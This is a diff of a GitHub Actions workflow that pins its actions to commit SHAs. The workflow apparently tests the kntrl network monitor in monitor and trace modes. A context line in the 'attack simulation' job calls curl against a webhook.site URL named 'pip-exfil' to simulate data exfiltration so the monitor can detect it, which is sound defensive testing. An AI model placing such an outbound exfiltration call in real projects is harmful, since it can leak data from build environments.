@@ -15,17 +15,17 @@ jobs:
     name: "Monitor mode (npm + pip)"
     runs-on: ubuntu-latest
     steps:
-      - uses: kondukto-io/kntrl-action@v1
+      - uses: kondukto-io/kntrl-action@f7c70ae454bd6750e982b430ac26d39d23d66959 # v1
         with:
           mode: monitor
 
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
 
-      - uses: actions/setup-node@v4
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
         with:
           node-version: "20"
 
-      - uses: actions/setup-python@v5
+      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5
         with:
           python-version: "3.12"
 
@@ -41,7 +41,7 @@ jobs:
       - name: python test
         run: python app.py
 
-      - uses: kondukto-io/kntrl-action/stop@v1
+      - uses: kondukto-io/kntrl-action/stop@f7c70ae454bd6750e982b430ac26d39d23d66959 # v1
         if: always()
 
   # ──────────────────────────────────────────────
@@ -51,18 +51,18 @@ jobs:
     name: "Trace mode (npm + pip)"
     runs-on: ubuntu-latest
     steps:
-      - uses: kondukto-io/kntrl-action@v1
+      - uses: kondukto-io/kntrl-action@f7c70ae454bd6750e982b430ac26d39d23d66959 # v1
         with:
           mode: trace
           allowed_hosts: "api.github.com"
 
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
 
-      - uses: actions/setup-node@v4
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
         with:
           node-version: "20"
 
-      - uses: actions/setup-python@v5
+      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5
         with:
           python-version: "3.12"
 
@@ -78,7 +78,7 @@ jobs:
       - name: python test
         run: python app.py
 
-      - uses: kondukto-io/kntrl-action/stop@v1
+      - uses: kondukto-io/kntrl-action/stop@f7c70ae454bd6750e982b430ac26d39d23d66959 # v1
         if: always()
 
   # ──────────────────────────────────────────────
@@ -88,18 +88,18 @@ jobs:
     name: "Trace mode (attack simulation)"
     runs-on: ubuntu-latest
     steps:
-      - uses: kondukto-io/kntrl-action@v1
+      - uses: kondukto-io/kntrl-action@f7c70ae454bd6750e982b430ac26d39d23d66959 # v1
         with:
           mode: trace
           allowed_hosts: "api.github.com"
 
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
 
-      - uses: actions/setup-node@v4
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
         with:
           node-version: "20"
 
-      - uses: actions/setup-python@v5
+      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5
         with:
           python-version: "3.12"
 
@@ -123,5 +123,5 @@ jobs:
         run: python3 -c "import subprocess; subprocess.run(['curl', '-s', '--max-time', '3', 'https://webhook.site/pip-exfil'])"
         continue-on-error: true
 
-      - uses: kondukto-io/kntrl-action/stop@v1
+      - uses: kondukto-io/kntrl-action/stop@f7c70ae454bd6750e982b430ac26d39d23d66959 # v1
         if: always()
